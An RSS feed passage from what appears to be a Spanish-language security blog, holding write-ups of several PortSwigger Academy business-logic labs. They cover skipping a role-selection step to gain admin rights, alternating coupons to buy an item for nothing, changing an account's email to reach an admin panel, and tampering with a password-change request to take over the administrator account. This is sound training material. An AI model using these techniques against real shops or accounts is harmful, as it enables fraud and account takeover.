			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request_hu21e92e161486fd2f3370558e4a789d7d_86976_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request_hu21e92e161486fd2f3370558e4a789d7d_86976_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Enviamos nuestras credenciales&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Enviamos nuestras credenciales&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora recibimos la opcion para elegir el rol, en esta ocasion lo que haremos es ignorar la peticion y eliminarla para que no se eliga el rol. Por lo que nos envia&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 245; 
			flex-basis: 588px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request2.png&#34; data-size=&#34;1203x491&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request2.png&#34;
			width=&#34;1203&#34;
			height=&#34;491&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request2_huf2cea5065fca0553a6a9d5cafc2e9c40_57291_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/request2_huf2cea5065fca0553a6a9d5cafc2e9c40_57291_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion a darle drop para ignorar&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion a darle drop para ignorar&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto nos podemos dirigir a la raiz &lt;code&gt;/&lt;/code&gt; y ver que error pudo generar el sistema, y vemos que nos muestra el admin panel entre las opciones y accedemos y eliminaremos al usuario carlos&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 214; 
			flex-basis: 515px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/resuelto.png&#34; data-size=&#34;1747x813&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/resuelto.png&#34;
			width=&#34;1747&#34;
			height=&#34;813&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/resuelto_hucc22d56c58da072fec3cdc2f7cc9fd9a_89841_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-8/resuelto_hucc22d56c58da072fec3cdc2f7cc9fd9a_89841_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 9</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/</link>
        <pubDate>Mon, 13 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 9" /&gt;&lt;h1 id=&#34;lab-flawed-enforcement-of-business-rules&#34;&gt;Lab: Flawed enforcement of business rules&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo que debemos poder realizar es comprar una chaqueta, pero tenemos diferentes codigos de descuento para aplicar.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 346px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento1.png&#34; data-size=&#34;1756x1215&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento1.png&#34;
			width=&#34;1756&#34;
			height=&#34;1215&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento1_hu920c8851d76c125750a6830131a5cf30_96649_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento1_hu920c8851d76c125750a6830131a5cf30_96649_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Descuento de 5 dolares&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Descuento de 5 dolares&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero viendo en el pie de pagina podemos ver un formulario de registro para obtener otro codigo&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 276; 
			flex-basis: 662px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuentoregistro.png&#34; data-size=&#34;1146x415&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuentoregistro.png&#34;
			width=&#34;1146&#34;
			height=&#34;415&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuentoregistro_hue738d89cf9e497cf349231546884795c_26189_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuentoregistro_hue738d89cf9e497cf349231546884795c_26189_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Descuento obtenido al registrar&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Descuento obtenido al registrar&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 156; 
			flex-basis: 375px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento2.png&#34; data-size=&#34;1722x1102&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento2.png&#34;
			width=&#34;1722&#34;
			height=&#34;1102&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento2_hudb225a18ac653a69dca2fa74da42094d_88959_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/descuento2_hudb225a18ac653a69dca2fa74da42094d_88959_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Descuento del 30% del producto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Descuento del 30% del producto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora lo que debemos hacer es poder comprar con 100 dolares de credito el producto de la chaqueta, para esto si ponemos 1 cupon y luego el otro nos dara un error ya que no permite ingresarlo nuevamente, pero si primero ingresamos uno y luego el otro lo permite la aplicacion que la aplicacion no valida, podemos comprar hasta por 0 dolares.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 114; 
			flex-basis: 274px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/cart.png&#34; data-size=&#34;1778x1552&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/cart.png&#34;
			width=&#34;1778&#34;
			height=&#34;1552&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/cart_hu4c7155751a73edd836ace3cd650e3c4b_135079_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/cart_hu4c7155751a73edd836ace3cd650e3c4b_135079_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Orden de compra&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Orden de compra&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al realizar la compra hemos solucionado el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 146; 
			flex-basis: 352px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/resuelto.png&#34; data-size=&#34;1778x1211&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/resuelto.png&#34;
			width=&#34;1778&#34;
			height=&#34;1211&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/resuelto_huae198e8914cf766b146ddd2f5258dd40_158342_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-9/resuelto_huae198e8914cf766b146ddd2f5258dd40_158342_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/</link>
        <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 5" /&gt;&lt;h1 id=&#34;lab-inconsistent-security-controls&#34;&gt;Lab: Inconsistent security controls&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Esta pagina es igual que podamos acceder al panel de admin para poder borrar al usuario carlos pero este usuario debe de contar con un mail del dominio dontwannacryh.com para poder acceder al panel.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 347px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/register.png&#34; data-size=&#34;1123x775&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/register.png&#34;
			width=&#34;1123&#34;
			height=&#34;775&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/register_hu096260c75218624c9811b9c80f550ebc_57910_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/register_hu096260c75218624c9811b9c80f550ebc_57910_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Registrar usuario con usuario atacante&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Registrar usuario con usuario atacante&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y al registrarnos recibimos el correo para poder habilitar la cuenta y acceder. Todo&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 192; 
			flex-basis: 461px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/mail.png&#34; data-size=&#34;1836x955&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/mail.png&#34;
			width=&#34;1836&#34;
			height=&#34;955&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/mail_hudde4913ef871eaf5e515f4fce4d4873f_172375_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/mail_hudde4913ef871eaf5e515f4fce4d4873f_172375_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo con link de activacion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo con link de activacion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora lo que queda es explotar esto, y al ingresar al sistema hay una funcion de actualizar el correo por lo que si intentamos actualizar funcionaria correctamente.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 201; 
			flex-basis: 482px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/updateemail.png&#34; data-size=&#34;1779x884&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/updateemail.png&#34;
			width=&#34;1779&#34;
			height=&#34;884&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/updateemail_hu21347d564ef513fd774666c68dd66ec3_97493_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/updateemail_hu21347d564ef513fd774666c68dd66ec3_97493_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Actualizar correo por un dominio dontwannacry.com&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Actualizar correo por un dominio dontwannacry.com&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Cuando ingresamos el nuevo correo ya se nos actualiza y ya podemos acceder al panel de admin sin que nos saque de la sesion o valide que ese es el correo asociada a esa cuenta.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 199; 
			flex-basis: 479px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/adminpanel.png&#34; data-size=&#34;1753x877&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/adminpanel.png&#34;
			width=&#34;1753&#34;
			height=&#34;877&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/adminpanel_hue1551d47712d014a123f6898963f8791_83893_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/adminpanel_hue1551d47712d014a123f6898963f8791_83893_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Panel de administracion al actualizar el mail&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Panel de administracion al actualizar el mail&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora accedemos y podemos borrar al usuario carlos para resolver el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 225; 
			flex-basis: 540px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/resuelto.png&#34; data-size=&#34;1780x791&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;791&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/resuelto_huff40e0b3dabe26536122c4c2ca8974f3_86768_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-5/resuelto_huff40e0b3dabe26536122c4c2ca8974f3_86768_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/</link>
        <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 6" /&gt;&lt;h1 id=&#34;lab-weak-isolation-on-dual-use-endpoint&#34;&gt;Lab: Weak isolation on dual-use endpoint&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Contamos con una cuenta con las credenciales de &lt;code&gt;wiener:peter&lt;/code&gt; para poder acceder, cuando entramos hay una funcion de actualizar datos como contrasena o correo.png. Tratamos de realizar la peticion con los siguientes datos:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 145; 
			flex-basis: 349px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/form.png&#34; data-size=&#34;1750x1203&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/form.png&#34;
			width=&#34;1750&#34;
			height=&#34;1203&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/form_hu11e06a0174ae05fe2eebba093fa4692c_78700_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/form_hu11e06a0174ae05fe2eebba093fa4692c_78700_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Formulario de actualizacion de datos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Formulario de actualizacion de datos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y la peticion es la siguiente:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 176; 
			flex-basis: 423px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/requestinicial.png&#34; data-size=&#34;1538x871&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/requestinicial.png&#34;
			width=&#34;1538&#34;
			height=&#34;871&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/requestinicial_hu47fa4c0c1927a1f15b205b5676ffda1f_158328_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/requestinicial_hu47fa4c0c1927a1f15b205b5676ffda1f_158328_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion realizada para el cambio de contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion realizada para el cambio de contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora vamos a modificar esa peticion para poder cambiar la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; porque el sistema no valida que el usuario sea al que se debe realizar el cambio y tampoco la contrasena actual para colocar la nueva. La peticion realizada es la siguiente:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 169; 
			flex-basis: 406px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/request.png&#34; data-size=&#34;1541x910&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/request.png&#34;
			width=&#34;1541&#34;
			height=&#34;910&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/request_hu22ba6dff961441dbb6dca31c1dcb205f_163132_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/request_hu22ba6dff961441dbb6dca31c1dcb205f_163132_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion realizada para actualiar la contrasena de administrator&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion realizada para actualiar la contrasena de administrator&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora tenemos acceso al panel del usuario &lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 332px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/adminpanel.png&#34; data-size=&#34;1727x1245&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/adminpanel.png&#34;
			width=&#34;1727&#34;
			height=&#34;1245&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/adminpanel_hue5c8dd2cfd6656ccb91f33d2e7c03906_108729_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/adminpanel_hue5c8dd2cfd6656ccb91f33d2e7c03906_108729_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Panel de administracion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Panel de administracion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ahora eliminamos al usuario a carlos para resolver el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 264; 
			flex-basis: 635px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/resuelto.png&#34; data-size=&#34;1792x677&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/resuelto.png&#34;
			width=&#34;1792&#34;
			height=&#34;677&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/resuelto_hu768ddc1e967feeafeb87da8944cf4f65_84309_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-6/resuelto_hu768ddc1e967feeafeb87da8944cf4f65_84309_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 7</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/</link>
        <pubDate>Sat, 11 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 7" /&gt;&lt;h1 id=&#34;lab-insufficient-workflow-validation&#34;&gt;Lab: Insufficient workflow validation&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
